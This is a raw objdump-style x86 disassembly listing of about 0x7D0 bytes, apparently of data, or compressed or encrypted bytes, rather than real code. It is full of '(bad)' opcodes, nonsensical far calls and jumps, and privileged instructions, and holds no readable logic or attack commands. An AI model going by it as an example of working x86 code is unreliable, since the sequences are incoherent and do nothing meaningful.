  410bf3:	xchg   DWORD PTR ds:0xde452720,esi
  410bf9:	imul   ecx,DWORD PTR [eax-0x1b],0xf9893264
  410c00:	stc    
  410c01:	jns    0x410bc7
  410c03:	jecxz  0x410c76
  410c05:	retf   
  410c06:	pop    esp
  410c07:	jae    0x410bc2
  410c09:	pop    esp
  410c0a:	call   0xafc1f4f7
  410c0f:	xchg   BYTE PTR [edi-0x140a053],ch
  410c15:	scas   eax,DWORD PTR es:[edi]
  410c16:	jecxz  0x410c09
  410c18:	clc    
  410c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c1a:	retf   
  410c1b:	xchg   edi,eax
  410c1c:	das    
  410c1d:	daa    
  410c1e:	or     eax,DWORD PTR [ebp+0x2a54ba42]
  410c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c25:	push   edi
  410c26:	scas   eax,DWORD PTR es:[edi]
  410c27:	pop    esi
  410c28:	sbb    eax,0x1b86e1be
  410c2d:	(bad)  
  410c2e:	fbstp  TBYTE PTR [ebp-0x29]
  410c31:	pop    ebp
  410c32:	aaa    
  410c33:	fbstp  TBYTE PTR [ebp-0x29]
  410c36:	pop    ebp
  410c37:	pop    ebx
  410c38:	sub    BYTE PTR [ebx-0x70],dh
  410c3b:	add    al,0x9f
  410c3d:	call   0x2244:0xbfbc6913
  410c44:	adc    ecx,0xc9f1d1d1
  410c4a:	leave  
  410c4b:	leave  
  410c4c:	aas    
  410c4d:	mov    WORD PTR [esp+ecx*4-0x2c58b2e4],cs
  410c54:	xor    esi,esi
  410c56:	ror    BYTE PTR [ebx+0x68],cl
  410c59:	add    al,0xf3
  410c5b:	inc    esp
  410c5c:	aas    
  410c5d:	pop    edi
  410c5e:	aam    0xfa
  410c60:	retf   
  410c61:	adc    edx,edi
  410c63:	and    eax,0xef77bfc2
  410c68:	fisubr WORD PTR [edi-0xc462312]
  410c6e:	pop    ds
  410c6f:	sub    al,bl
  410c71:	addr16 div ecx
  410c74:	mov    bl,BYTE PTR [edi]
  410c76:	ds jge 0x410c29
  410c79:	cmp    al,0x2a
  410c7b:	sub    eax,0x79e2fc7e
  410c80:	add    BYTE PTR [esi-0x69c8d094],dl
  410c86:	inc    eax
  410c87:	mov    al,0xb
  410c89:	loopne 0x410c9c
  410c8b:	rcl    edx,0x77
  410c8e:	inc    ecx
  410c8f:	inc    esp
  410c90:	rol    BYTE PTR [edi+0x16],0x12
  410c94:	arpl   WORD PTR [edx+eiz*1],cx
  410c97:	sbb    eax,esi
  410c99:	arpl   WORD PTR [esi-0x49],bp
  410c9c:	fcmovne st,st(2)
  410c9e:	out    0x34,al
  410ca0:	or     al,0xc3
  410ca2:	dec    edx
  410ca3:	cld    
  410ca4:	mov    ds:0x6f4c87ef,al
  410ca9:	push   0xd
  410cab:	enter  0x72e5,0xe8
  410caf:	jmp    0x9314:0x4e5a92ea
  410cb6:	mov    al,ds:0x2972001c
  410cbb:	mov    DWORD PTR [eax],eax
  410cbd:	cmp    BYTE PTR [ecx],dl
  410cbf:	nop
  410cc0:	xchg   ebp,eax
  410cc1:	push   eax
  410cc2:	sub    dl,BYTE PTR [ebp-0x391c8e50]
  410cc8:	fistp  DWORD PTR [esi+0x7f89e278]
  410cce:	(bad)  
  410ccf:	jmp    0x2ffb8c23
  410cd4:	sbb    cl,BYTE PTR [ebp+0x152a56ce]
  410cda:	push   edi
  410cdb:	cs xchg edi,eax
  410cdd:	ror    DWORD PTR [edi+0x7232391c],cl
  410ce3:	in     al,0xc8
  410ce5:	xchg   ecx,eax
  410ce6:	mov    eax,ds:0x67ecfd9f
  410ceb:	out    dx,al
  410cec:	pusha  
  410ced:	xor    BYTE PTR [eax],bl
  410cef:	mov    eax,0xfedbb6ed
  410cf4:	jmp    0x81e:0xde6f9be6
  410cfb:	add    al,0xd6
  410cfd:	sbb    eax,0xddf47a3d
  410d02:	xchg   ebx,eax
  410d03:	daa    
  410d04:	dec    edi
  410d05:	push   ds
  410d06:	add    edx,eax
  410d08:	leave  
  410d09:	(bad)  
  410d0a:	outs   dx,DWORD PTR ds:[esi]
  410d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d0c:	lds    edi,FWORD PTR [edx+0x20b2db8]
  410d12:	repnz add BYTE PTR [ecx],ah
  410d15:	daa    
  410d16:	add    DWORD PTR [edx+0x49],esi
  410d19:	test   eax,0xa40cb72c
  410d1e:	pop    eax
  410d1f:	popa   
  410d20:	ja     0x410d82
  410d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d23:	adc    al,0x45
  410d25:	fld    st(0)
  410d27:	std    
  410d28:	jg     0x410d44
  410d2a:	adc    al,0x94
  410d2c:	(bad)  
  410d2d:	push   0x1f6a00b2
  410d32:	fwait
  410d33:	imul   esi,DWORD PTR [ebp+0x16],0x86c20ca2
  410d3a:	sti    
  410d3b:	shr    al,1
  410d3d:	pop    ecx
  410d3e:	pop    ss
  410d3f:	push   cs
  410d40:	xchg   DWORD PTR [ebp-0x6054a48a],ebp
  410d46:	mov    eax,0x37799b5a
  410d4b:	push   ds
  410d4c:	(bad)  
  410d4d:	arpl   WORD PTR [edx+0x62],sp
  410d50:	add    ch,BYTE PTR [ecx-0x75dd35ac]
  410d56:	pusha  
  410d57:	xor    BYTE PTR [eax+0x608c3870],cl
  410d5d:	xor    BYTE PTR [eax-0x717bd7b0],cl
  410d63:	mov    cs,WORD PTR [esi]
  410d65:	xchg   edi,eax
  410d66:	iret   
  410d67:	out    0xb,eax
  410d69:	add    DWORD PTR [eax+0x5ecd9b3e],edi
  410d6f:	pop    edi
  410d70:	out    dx,eax
  410d71:	cmc    
  410d72:	addr16 mov eax,0xc3c2eedd
  410d78:	(bad)  
  410d7a:	in     al,dx
  410d7b:	jmp    0x410d68
  410d7d:	jmp    0x410d72
  410d7f:	add    al,0x83
  410d81:	inc    ecx
  410d82:	js     0x410d41
  410d84:	pop    esi
  410d85:	retf   
  410d86:	(bad)  
  410d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d88:	in     al,0x90
  410d8a:	(bad)
  410d8d:	dec    esp
  410d8e:	dec    esi
  410d8f:	dec    esi
  410d90:	and    bl,BYTE PTR [edx]
  410d92:	lea    esp,[edx]
  410d94:	push   ds
  410d95:	(bad)  
  410d96:	setge  BYTE PTR ds:0xd4c0f67b
  410d9d:	aam    0xd4
  410d9f:	inc    edi
  410da0:	xchg   BYTE PTR [ecx+0x64],ah
  410da3:	ror    BYTE PTR [eax],1
  410da5:	mov    ah,0x14
  410da7:	mov    al,0x34
  410da9:	call   0xf6fa:0x27d1976f
  410db0:	mov    ds:0xf024df7f,al
  410db5:	in     al,dx
  410db6:	std    
  410db7:	push   esi
  410db8:	imul   ebp
  410dba:	(bad)  [edi-0x29]
  410dbd:	sbb    eax,0xdbf1dc77
  410dc2:	bound  esi,QWORD PTR [ecx-0x3524ebe8]
  410dc8:	jmp    0xd7286a24
  410dcd:	adc    edi,edi
  410dcf:	xchg   ebp,eax
  410dd0:	xchg   ebp,eax
  410dd1:	adc    DWORD PTR [edi+0x333c32f3],ecx
  410dd7:	iret   
  410dd8:	mov    es,WORD PTR [eax+edi*8+0x39]
  410ddc:	push   esi
  410ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dde:	ins    DWORD PTR es:[edi],dx
  410ddf:	pop    edx
  410de0:	sbb    bh,al
  410de2:	cmp    ah,BYTE PTR [ebp+0x156f35f]
  410de8:	cli    
  410de9:	pop    esi
  410dea:	mov    eax,0x81922cff
  410def:	sbb    eax,0x11d59039
  410df4:	or     BYTE PTR [edx+ebx*4],al
  410df7:	fmul   QWORD PTR [edi]
  410df9:	dec    ebp
  410dfa:	rcl    DWORD PTR [eax-0x326e9933],cl
  410e00:	xchg   cx,ax
  410e02:	leave  
  410e03:	mov    al,fs:0x7a7a0a28
  410e09:	jp     0x410db7
  410e0b:	cli    
  410e0c:	xchg   ecx,eax
  410e0d:	push   ebp
  410e0e:	inc    ecx
  410e0f:	push   ecx
  410e10:	jns    0x410e40
  410e12:	hlt    
  410e13:	je     0x410db1
  410e15:	aas    
  410e16:	sbb    edi,DWORD PTR [ecx-0x653bbfe]
  410e1c:	jl     0x410e3c
  410e1e:	pop    ebx
  410e1f:	mov    dh,0x6c
  410e21:	fprem1 
  410e23:	les    edx,FWORD PTR [ebx]
  410e25:	dec    edi
  410e26:	cld    
  410e27:	(bad)  
  410e28:	daa    
  410e29:	lahf   
  410e2a:	jl     0x410e1e
  410e2c:	jnp    0x410db9
  410e2e:	mov    ecx,DWORD PTR [ebx-0x1d56e5e6]
  410e34:	(bad)  
  410e35:	push   0xffffffb5
  410e37:	push   0x68
  410e39:	call   0xc2ec:0x763b1e66
  410e40:	mov    cl,0x63
  410e42:	(bad)  
  410e43:	ds scas al,BYTE PTR es:[edi]
  410e45:	push   edi
  410e47:	push   ds
  410e48:	aam    0x84
  410e4a:	lahf   
  410e4b:	imul   esi,DWORD PTR [edi+0x51],0xffffffd3
  410e4f:	mov    eax,DWORD PTR [eax+eax*1]
  410e52:	sub    al,0xd
  410e54:	adc    BYTE PTR [edx+0x3245f9a],cl
  410e5a:	xor    DWORD PTR [eax],ebp
  410e5c:	dec    eax
  410e5d:	push   ss
  410e5e:	add    eax,edx
  410e60:	add    BYTE PTR [esi+edx*2],0x44
  410e64:	add    BYTE PTR [edx-0x4cb75b5e],cl
  410e6a:	mov    eax,DWORD PTR [ecx-0x41]
  410e6d:	fidiv  DWORD PTR [esi-0x5c99a13f]
  410e73:	ror    DWORD PTR [esi],cl
  410e75:	mov    ch,0xa1
  410e77:	sbb    eax,DWORD PTR [esi+0x1b1bb561]
  410e7d:	xchg   BYTE PTR [ecx-0x173c790],al
  410e83:	(bad)  
  410e84:	jle    0x410e71
  410e86:	pop    fs
  410e88:	mov    dl,0xe5
  410e8a:	jb     0x410ea5
  410e8c:	mov    ds:0x1b18a3a3,eax
  410e91:	sbb    eax,DWORD PTR [ebx-0x4a]
  410e94:	ds ret 0x9d0c
  410e98:	dec    ebx
  410e99:	cmp    edx,esp
  410e9b:	fs and eax,edx
  410e9e:	pop    ds
  410e9f:	scas   eax,DWORD PTR es:[edi]
  410ea0:	jmp    0x410f1c
  410ea2:	jge    0x410e52
  410ea4:	sti    
  410ea5:	push   cs
  410ea6:	test   bl,al
  410ea8:	popa   
  410ea9:	or     al,0xc
  410eab:	or     al,0xb8
  410ead:	cmp    bh,BYTE PTR [edx]
  410eaf:	cmp    al,BYTE PTR [edx-0x55]
  410eb2:	push   edi
  410eb3:	scas   eax,DWORD PTR es:[edi]
  410eb4:	inc    esi
  410eb5:	xor    BYTE PTR [eax],bl
  410eb7:	test   bh,bl
  410eb9:	out    dx,eax
  410eba:	xchg   DWORD PTR [ecx+0x18],esp
  410ebd:	dec    ebp
  410ebe:	int    0x79
  410ec0:	xchg   edi,eax
  410ec1:	cs pop ebp
  410ec3:	inc    edx
  410ec4:	cmp    al,0x1e
  410ec6:	(bad)  
  410ec7:	cld    
  410ec8:	cld    
  410ec9:	jl     0x410f45
  410ecb:	push   0xbe5e868
  410ed0:	pop    ss
  410ed1:	cs mov esp,0xe20dad5d
  410ed7:	inc    ecx
  410ed8:	das    
  410ed9:	xchg   edi,eax
  410eda:	int3   
  410edb:	jns    0x410f27
  410edd:	ficom  DWORD PTR [ecx]
  410edf:	xor    eax,0x12000f3e
  410ee4:	fist   DWORD PTR [edx+0x699a2f9f]
  410eea:	mov    ds:0xbfaf83f0,al
  410eef:	repnz retf 0xa12b
  410ef3:	dec    eax
  410ef4:	and    al,0xf2
  410ef6:	mov    edi,0x2e0b4d34
  410efb:	(bad)  
  410efc:	in     al,dx
  410efd:	xchg   edi,eax
  410efe:	sbb    eax,0xb10723b3
  410f03:	mov    esp,0x49103dcc
  410f08:	ret    0x22ce
  410f0b:	loopne 0x410eaa
  410f0d:	mov    edx,0x86113f68
  410f12:	cwde   
  410f13:	inc    ebp
  410f14:	mov    DWORD PTR [ebx-0x2071ab7e],0x45030793
  410f1e:	xor    ah,BYTE PTR [eax]
  410f20:	rcl    DWORD PTR [ebx],0x5b
  410f23:	sub    BYTE PTR [edi+edx*4-0x55faa33a],ch
  410f2a:	pop    ss
  410f2b:	dec    ebp
  410f2c:	xlat   BYTE PTR ds:[ebx]
  410f2d:	push   esi
  410f2e:	sub    dl,BYTE PTR [ebp-0x539b3670]
  410f34:	sub    al,0xcd
  410f36:	dec    eax
  410f37:	and    al,0x62
  410f39:	inc    ebp
  410f3a:	loop   0x410fb5
  410f3c:	inc    edx
  410f3d:	xchg   edx,eax
  410f3e:	push   0x89598945
  410f43:	push   esp
  410f44:	addr16 dec esi
  410f46:	adc    BYTE PTR [ebp-0x2914febe],al
  410f4c:	lods   eax,DWORD PTR ds:[esi]
  410f4d:	mov    ebx,0x9dcee77e
  410f52:	pop    edi
  410f53:	cmp    BYTE PTR [esi-0x14],dh
  410f56:	fdivr  DWORD PTR [edi+0x43cc96a3]
  410f5c:	add    al,BYTE PTR [edi-0x3e]
  410f5f:	inc    edi
  410f60:	and    esi,DWORD PTR [edi]
  410f62:	mov    edi,DWORD PTR [esi-0x118e27c2]
  410f68:	fcomi  st,st(3)
  410f6a:	outs   dx,DWORD PTR ds:[esi]
  410f6b:	or     DWORD PTR [ebx],0xffffffb0
  410f6e:	mov    dl,dh
  410f70:	fisttp WORD PTR [esi]
  410f72:	mov    edi,0xbf37bf2f
  410f77:	pop    ds
  410f78:	inc    ecx
  410f79:	dec    edx
  410f7a:	add    cl,bl
  410f7c:	add    BYTE PTR es:[ebp-0x29],bl
  410f80:	stos   DWORD PTR es:[edi],eax
  410f81:	add    BYTE PTR [edx-0x66e44892],dl
  410f87:	dec    esp
  410f88:	sbb    dh,BYTE PTR [ebx-0x1417cc4d]
  410f8e:	jmp    0x410f97
  410f90:	dec    ebp
  410f91:	(bad)  
  410f93:	call   0x2b25bba
  410f98:	mov    ch,0x69
  410f9a:	ds je  0x410f3b
  410f9d:	jle    0x410f88
  410f9f:	jbe    0x410f5c
  410fa1:	inc    ecx
  410fa2:	cmp    eax,0xb82cf8e8
  410fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fa8:	push   edx
  410fa9:	or     ecx,edx
  410fab:	push   0x93939314
  410fb0:	pop    eax
  410fb1:	pop    eax
  410fb2:	pop    eax
  410fb3:	and    BYTE PTR [ebx],dh
  410fb5:	shr    DWORD PTR [eax],1
  410fb7:	xchg   edi,eax
  410fb8:	retf   
  410fb9:	fiadd  WORD PTR cs:[esi+edx*2]
  410fbd:	lods   eax,DWORD PTR ds:[esi]
  410fbe:	push   esi
  410fbf:	push   ecx
  410fc0:	sub    bh,bl
  410fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc3:	mov    al,0x32
  410fc5:	add    BYTE PTR [eax],al
  410fc7:	pop    ss
  410fc8:	jae    0x411013
  410fca:	inc    esp
  410fcb:	inc    ecx
  410fcc:	push   esp
  410fcd:	xchg   ebp,eax
  410fce:	lods   al,BYTE PTR ds:[esi]
  410fcf:	aas    
  410fd0:	xchg   ebp,eax
  410fd1:	xor    al,0x3b
  410fd3:	cdq    
  410fd4:	jae    0x411014
  410fd6:	lahf   
  410fd7:	(bad)  
  410fd9:	jge    0x411058
  410fdb:	push   esi
  410fdc:	add    al,BYTE PTR [esi-0x5d4a1429]
  410fe2:	retf   0x2f97
  410fe5:	pop    edi
  410fe6:	inc    esi
  410fe7:	cmp    bl,BYTE PTR [ebp+0x8c8c8c6]
  410fed:	es daa 
  410fef:	daa    
  410ff0:	jae    0x410fa3
  410ff2:	pop    eax
  410ff3:	in     al,dx
  410ff4:	call   0xec3200e9
  410ff9:	cdq    
  410ffa:	dec    esp
  410ffb:	es (bad) 
  410ffd:	pop    esi
  410ffe:	stos   BYTE PTR es:[edi],al
  410fff:	lods   al,BYTE PTR ds:[esi]
  411000:	int    0x5e
  411002:	(bad)  
  411003:	mov    WORD PTR [edi+0x66],es
  411006:	mov    esi,0xb2abdc18
  41100b:	imul   ebx,ecx,0x6a
  41100e:	jl     0x41100e
  411010:	jle    0x411055
  411012:	mov    eax,ds:0x4d340fd0
  411017:	mov    ebx,0xdbeb4ed9
  41101c:	or     DWORD PTR [ebx+ebp*1-0x15],esp
  411020:	and    BYTE PTR [eax],0x5b
  411023:	xchg   edi,eax
  411024:	jge    0x41100e
  411026:	jbe    0x41100e
  411028:	mov    dl,0x78
  41102a:	or     eax,0x36ad4d00
  41102f:	rcl    BYTE PTR [edx+0x4b],0x0
  411033:	push   0x49ae0b26
  411038:	inc    ebp
  411039:	bound  esp,QWORD PTR [eax]
  41103b:	ret    0x3221
  41103e:	and    BYTE PTR [edi-0x6f],dl
  411041:	xchg   esp,eax
  411042:	push   es
  411043:	iret   
  411044:	rcl    BYTE PTR [ebx],1
  411046:	sti    
  411047:	loopne 0x4110bc
  411049:	mov    ds:0xfdfb7ba0,al
  41104e:	jle    0x41107b
  411050:	sbb    esi,DWORD PTR [eax-0x2ca6d5ac]
  411056:	mov    eax,0xeb51baf1
  41105b:	adc    al,0xd5
  41105d:	inc    ecx
  41105e:	and    al,0x2a
  411060:	dec    esi
  411061:	fs cld 
  411063:	xchg   edi,eax
  411064:	xchg   esp,eax
  411065:	fiadd  WORD PTR [ebx-0x1f07c1f1]
  41106b:	jnp    0x41105c
  41106d:	mov    ebp,0xf9acc477
  411072:	rcl    BYTE PTR [ebp+ecx*8-0x1332d3f9],0x3
  41107a:	call   0xe40a:0xe02e03bf
  411081:	or     al,BYTE PTR [edx+0x50864d62]
  411087:	sahf   
  411088:	scas   al,BYTE PTR es:[edi]
  411089:	and    eax,0xb2686c4e
  41108e:	jae    0x411038
  411090:	or     bl,BYTE PTR ds:[edx+0x358e8749]
  411097:	popa   
  411098:	inc    ebp
  411099:	jecxz  0x41109c
  41109b:	mov    esp,0xcfdbf6fd
  4110a0:	out    dx,eax
  4110a1:	fnstsw WORD PTR [ebx+0x52a57777]
  4110a7:	jmp    0x8b78be9
  4110ac:	pop    ebp
  4110ad:	pop    ebp
  4110ae:	fnstsw WORD PTR [eax-0x14c4310d]
  4110b4:	xchg   ecx,eax
  4110b5:	stc    
  4110b6:	jb     0x41104b
  4110b8:	or     esp,DWORD PTR [eax+0x47db5aa]
  4110be:	push   0xffffffe7
  4110c0:	and    eax,0xccb4a501
  4110c5:	jp     0x4110e1
  4110c7:	sub    eax,0x31676766
  4110cc:	cmp    edi,DWORD PTR [ebx]
  4110ce:	mov    ebp,DWORD PTR [esi+esi*1+0xb]
  4110d2:	push   ebp
  4110d3:	push   ebp
  4110d4:	xchg   ecx,eax
  4110d5:	leave  
  4110d6:	fs (bad) 
  4110d8:	sbb    BYTE PTR [edi+0x72e74fc7],cl
  4110de:	mov    ecx,0xfd358004
  4110e3:	std    
  4110e4:	std    
  4110e5:	ja     0x41106b
  4110e7:	inc    edx
  4110e8:	mov    eax,ds:0x478f1e4d
  4110ed:	imul   ecx,DWORD PTR [ebp+ecx*2-0x13],0x22002269
  4110f5:	cmp    esi,0x4a947efe
  4110fb:	and    eax,0x981e3c78
  411100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411101:	mov    DWORD PTR [edx+ebp*1-0x7b],edx
  411105:	push   esp
  411106:	sub    al,BYTE PTR [ebp+0xa119191]
  41110c:	lock lea ecx,[edi+ecx*1]
  411110:	ud0    edi,DWORD PTR [esi+0x7e]
  411114:	jle    0x411114
  411116:	push   esp
  411117:	cs xchg edi,eax
  411119:	mov    esi,DWORD PTR [ebx+0x79cc813f]
  41111f:	xchg   ecx,eax
  411120:	add    BYTE PTR [ecx+edx*8+0x7c],ah
  411124:	sar    al,cl
  411126:	bound  esi,QWORD PTR [edi+ebx*2]
  411129:	(bad)  
  41112a:	adc    al,0xd3
  41112c:	xor    ah,BYTE PTR [eax]
  41112e:	repz mov ebx,0x736efddf
  411134:	mov    eax,ds:0xb68c7850
  411139:	in     eax,dx
  41113a:	test   BYTE PTR [ecx+0x26],bl
  41113d:	fmul   st,st(3)
  41113f:	and    eax,0xd45d710a
  411144:	bnd jl 0x4110e2
  411147:	or     eax,DWORD PTR [esi-0x6f8fad18]
  41114d:	mov    al,ds:0x73168690
  411152:	jmp    DWORD PTR [ebp-0x5]
  411155:	leave  
  411156:	jl     0x41113f
  411158:	pop    ecx
  411159:	jbe    0x4111bd
  41115b:	mov    ebp,0xd5af5ebc
  411160:	cld    
  411161:	inc    esi
  411162:	scas   al,BYTE PTR es:[edi]
  411163:	add    DWORD PTR [edi+0x410d0021],ecx
  411169:	in     al,0xf7
  41116b:	jecxz  0x411164
  41116d:	mov    eax,ds:0xe3c7b260
  411172:	pop    ecx
  411173:	adc    bl,BYTE PTR [ebx-0x7fb77a5e]
  411179:	xchg   ebx,eax
  41117a:	or     esi,DWORD PTR [edi+0x73f3f832]
  411180:	sub    esp,DWORD PTR [eax-0x389dd3a8]
  411186:	mov    ds,WORD PTR ds:0xf0fc3cf7
  41118c:	ret    
  41118d:	(bad)  
  41118f:	mov    edi,0xa8abff7f
  411194:	leave  
  411195:	xchg   ecx,eax
  411196:	popf   
  411197:	mov    ecx,0x310b340e
  41119c:	outs   dx,DWORD PTR ds:[esi]
  41119d:	mov    bl,0xe7
  41119f:	jle    0x4111dd
  4111a1:	and    BYTE PTR [edi],ah
  4111a3:	paddd  mm1,mm3
  4111a6:	lods   eax,DWORD PTR ds:[esi]
  4111a7:	add    cl,BYTE PTR [eax-0x36]
  4111aa:	leave  
  4111ab:	sub    al,0x9
  4111ad:	xchg   edi,eax
  4111ae:	jo     0x41115c
  4111b0:	jmp    0x1526dd0
  4111b5:	dec    esp
  4111b6:	dec    ebp
  4111b7:	dec    ebp
  4111b8:	jge    0x411232
  4111ba:	icebp  
  4111bb:	loop   0x411182
  4111bd:	push   DWORD PTR [edx-0x68492493]
  4111c3:	mov    eax,ebp
  4111c5:	mov    ds:0x873f3f3a,al
  4111ca:	shl    DWORD PTR [edi+0x2a54a14f],cl
  4111d0:	shr    edi,0xaf
  4111d3:	in     eax,0xd7
  4111d5:	jo     0x41124d
  4111d7:	scas   eax,DWORD PTR es:[edi]
  4111d8:	cmc    
  4111d9:	sbb    DWORD PTR [eax+0x73625cbd],ebp
  4111df:	mov    al,ds:0xca6811a1
  4111e4:	sub    al,0xea
  4111e6:	enter  0xf53,0xc
  4111ea:	(bad)  
  4111eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ee:	(bad)  
  4111ef:	mov    WORD PTR [ebp+0x2e507d8d],cs
  4111f5:	xchg   edi,eax
  4111f6:	dec    ebx
  4111f7:	cmc    
  4111f8:	cmp    cl,BYTE PTR [esi]
  4111fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111fb:	push   edx
  4111fc:	test   eax,0xc89123f7
  411201:	xchg   dh,cl
  411203:	into   
  411204:	into   
  411205:	call   eax
  411207:	rcl    ebx,cl
  411209:	mov    bl,0xcb
  41120b:	jmp    0x411202
  41120d:	jbe    0x41125f
  41120f:	xor    BYTE PTR [edi+0x72e5c008],al
  411215:	pop    ecx
  411216:	add    eax,DWORD PTR [ebx+0x78152a54]
  41121c:	cmp    al,0x1e
  41121e:	or     ch,dl
  411220:	popa   
  411221:	jl     0x41129f
  411223:	sbb    al,0xd1
  411225:	push   0x74747c74
  41122a:	je     0x4112ab
  41122c:	sub    al,0x16
  41122e:	jnp    0x41120f
  411230:	xor    al,0x4d
  411232:	sbb    cl,BYTE PTR [esi-0x8c74b77]
  411238:	in     eax,dx
  411239:	(bad)
  41123c:	mov    cl,0xd3
  41123e:	mov    gs,WORD PTR [ecx+ecx*1+0x28bd0b8f]
  411245:	call   0x85f23577
  41124a:	inc    edx
  41124b:	popa   
  41124c:	xchg   edi,eax
  41124d:	mov    ds:0xdc36d428,al
  411252:	push   esi
  411253:	js     0x411204
  411255:	aam    0x4a
  411257:	and    BYTE PTR [eax+0x3f18aebe],cl
  41125d:	adc    bl,bl
  41125f:	leave  
  411260:	stc    
  411261:	cmp    eax,0xe24a1e9a
  411266:	push   DWORD PTR [ebx+0x41]
  411269:	daa    
  41126a:	inc    ecx
  41126b:	adc    al,0x4d
  41126d:	imul   ebx,esi,0x933e2b9c
  411273:	sub    BYTE PTR [eax-0x284363cc],al
  411279:	jmp    0x411230
  41127b:	lods   al,BYTE PTR ds:[esi]
  41127c:	add    bl,BYTE PTR [ecx-0x12]
  41127f:	inc    ecx
  411280:	sub    eax,0xba68d4f3
  411285:	aas    
  411286:	call   DWORD PTR [esi]
  411288:	inc    ebp
  411289:	ret    0xcd10
  41128c:	jle    0x41123f
  41128e:	arpl   WORD PTR [edx],dx
  411290:	aas    
  411291:	(bad)  
  411292:	pop    ebx
  411293:	push   ds
  411294:	mov    WORD PTR [eax-0x6c],fs
  411297:	pop    es
  411298:	pop    ds
  411299:	jl     0x41128b
  41129b:	xchg   ecx,eax
  41129c:	aaa    
  41129d:	fidivr WORD PTR [eax-0x1d]
  4112a0:	push   eax
  4112a1:	test   eax,0x59a32a54
  4112a6:	xor    BYTE PTR [ecx+0x33b51696],bh
  4112ac:	lods   eax,DWORD PTR ds:[esi]
  4112ad:	fwait
  4112ae:	push   0xeb5ccc2d
  4112b3:	mov    bh,0x13
  4112b5:	jp     0x411275
  4112b7:	cs jae 0x4112f3
  4112ba:	test   al,0x4f
  4112bc:	leave  
  4112bd:	xchg   edx,eax
  4112be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112bf:	rcl    DWORD PTR ds:0xfbf4088f,0xdf
  4112c6:	(bad)  
  4112c7:	(bad)  
  4112c8:	(bad)  
  4112c9:	clc    
  4112ca:	jl     0x41128a
  4112cc:	popf   
  4112cd:	fwait
  4112ce:	ss ins DWORD PTR es:[edi],dx
  4112d0:	cli    
  4112d1:	mov    eax,ds:0x9998aaaa
  4112d6:	cdq    
  4112d7:	sub    DWORD PTR [edx+0x2a8508aa],0x40585858
  4112e1:	and    al,0x12
  4112e3:	mov    cl,0xcc
  4112e5:	jp     0x4112e1
  4112e7:	ds test al,0x59
  4112ea:	mov    BYTE PTR [esi+0x5e],bl
  4112ed:	ds lahf 
  4112ef:	(bad)  
  4112f0:	in     al,dx
  4112f1:	in     al,dx
  4112f2:	lods   al,BYTE PTR ds:[esi]
  4112f3:	aad    0x75
  4112f5:	mov    bh,0xce
  4112f7:	(bad)  
  4112f8:	leave  
  4112f9:	mov    edx,DWORD PTR [edi]
  4112fb:	das    
  4112fc:	(bad)  
  4112fd:	es push ss
  4112ff:	mov    ebx,DWORD PTR [ebp-0x70c28a2f]
  411305:	pop    edx
  411306:	jo     0x41128d
  411308:	xor    ch,ah
  41130a:	push   eax
  41130b:	lods   eax,DWORD PTR ds:[esi]
  41130c:	push   esi
  41130d:	mov    ecx,DWORD PTR [ebx+0x17678b8b]
  411313:	pop    ss
  411314:	pop    ss
  411315:	xchg   DWORD PTR [edx-0x313e1b37],edx
  41131b:	into   
  41131c:	into   
  41131d:	pop    ebx
  41131e:	and    dl,BYTE PTR [ecx+0x60c18dc8]
  411324:	jo     0x4112c1
  411326:	popa   
  411327:	sbb    BYTE PTR [esi+0x4a],bl
  41132a:	mov    ax,ds:0xebd79f20
  411330:	(bad)
  411333:	sub    al,0x8e
  411335:	pop    ds
  411336:	aas    
  411337:	mov    fs,WORD PTR [edx+esi*1+0x59]
  41133b:	sahf   
  41133c:	sahf   
  41133d:	sahf   
  41133e:	cmp    BYTE PTR ds:[esp+edi*1],bh
  411342:	cld    
  411343:	outs   dx,DWORD PTR ds:[esi]
  411344:	test   DWORD PTR [edx+0x61],eax
  411347:	scas   al,BYTE PTR es:[edi]
  411348:	(bad)  
  411349:	fcomp  QWORD PTR [ebx+eiz*8-0xd]
  41134d:	out    0x3c,al
  41134f:	mov    cl,0x29
  411351:	pop    DWORD PTR [edi]
  411353:	idiv   DWORD PTR [eax-0x19754850]
  411359:	jae    0x41130f
  41135b:	adc    al,0xfe
  41135d:	cmp    dh,BYTE PTR [esi+0x2]
  411360:	lods   eax,DWORD PTR ds:[esi]
  411361:	dec    ebp
  411362:	jne    0x41139f
  411364:	sub    al,0x47
  411366:	repz repz mov dl,0x32
  41136a:	loope  0x411383
  41136c:	xor    eax,0xe012ccbe
  411371:	mul    eax
  411373:	es mov esi,0x34dcf028
  411379:	daa    
  41137a:	test   DWORD PTR [edi-0x66f47fb8],0x5f82d5ac
  411384:	xchg   DWORD PTR [edi-0x36ee0459],edx
  41138a:	xchg   ebx,eax
  41138b:	inc    ebp
  41138c:	push   eax
  41138d:	sub    dl,BYTE PTR [ebp+0x324809a4]
  411393:	jae    0x411333
  411395:	mov    ah,0x3d
  411397:	daa    
  411398:	or     DWORD PTR [edx-0x17d32ffd],ebp
  41139e:	mov    ds:0x4bafc04b,al
  4113a3:	in     eax,0xea
  4113a5:	mov    ds:0xf9b86d41,eax
  4113aa:	out    0x9b,al
  4113ac:	outs   dx,DWORD PTR ds:[esi]
  4113ad:	cmp    al,0x71
  4113af:	loop   0x411375
  4113b1:	sbb    esp,edx
  4113b3:	cmp    BYTE PTR [ebp+0x5c],0xf8
  4113b7:	js     0x411419
  4113b9:	addps  xmm5,XMMWORD PTR [edx+0x5]
  4113bd:	lock aas 
  4113bf:	dec    eax
  4113c0:	mov    dh,0xce
  4113c2:	add    eax,0x713955b8
  4113c7:	popf   
  4113c8:	outs   dx,DWORD PTR ds:[esi]
  4113c9:	jae    0x411356
